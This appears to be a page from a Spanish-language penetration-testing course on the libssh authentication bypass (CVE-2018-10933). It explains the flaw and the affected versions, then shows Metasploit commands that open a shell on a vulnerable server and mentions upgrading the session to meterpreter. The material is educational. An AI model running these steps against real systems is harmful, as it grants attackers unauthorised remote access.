# libssh Authentication Bypass (CVE-2018-10933)

La vulnerabilidad CVE-2018-10933 afecta a determinadas versiones de libssh, una biblioteca ampliamente utilizada para implementar funcionalidades del protocolo SSH en aplicaciones cliente y servidor.

El fallo se encontraba en la máquina de estados utilizada por libssh en modo servidor para gestionar el proceso de autenticación. Debido a un error lógico en el tratamiento de determinados mensajes del protocolo SSH, un cliente malicioso podía hacer que el servidor considerase autenticada una conexión sin haber validado previamente ninguna credencial.

En condiciones normales, un cliente SSH debe demostrar su identidad mediante un proceso de autenticación. Sin embargo, la vulnerabilidad permitía alterar la secuencia esperada de mensajes del protocolo y forzar al servidor vulnerable a aceptar la sesión como legítima. Como resultado, un atacante remoto podía acceder a los servicios ofrecidos por la aplicación sin necesidad de conocer usuarios, contraseñas o claves válidas.

La vulnerabilidad afectaba únicamente al código de libssh ejecutándose en modo servidor; las aplicaciones que utilizaban la biblioteca exclusivamente como cliente no estaban expuestas al problema. Las versiones vulnerables incluían las ramas 0.6.x, 0.7.x anteriores a la versión 0.7.6 y 0.8.x anteriores a la versión 0.8.4.

### Explotación con MSF

El módulo auxiliary/scanner/ssh/libssh_auth_bypass de Metasploit fue desarrollado para detectar y verificar la presencia de esta vulnerabilidad en sistemas que ejecutaban versiones afectadas de libssh, convirtiéndose en una de las implementaciones más conocidas para evaluar la exposición a CVE-2018-10933.

```bash
msf > use auxiliary/scanner/ssh/libssh_auth_bypass
[*] Setting default action Shell - view all 2 actions with the show actions command
msf auxiliary(scanner/ssh/libssh_auth_bypass) > set rhosts host
msf auxiliary(scanner/ssh/libssh_auth_bypass) > set spawn_pty true
msf auxiliary(scanner/ssh/libssh_auth_bypass) > run
```

**SPAWN_PTY** es una opción presente en algunos módulos de Metasploit que permite solicitar la creación de un pseudo-terminal interactivo (PTY) en sistemas Unix o Linux. Un PTY es una interfaz que emula el comportamiento de una terminal real.

De la misma forma que en las vulnerabilidades linux anteriores, podemos elevar la sesión a meterpreter.

[⟵ Anterior](../05_sistema.md#explotación-linux)
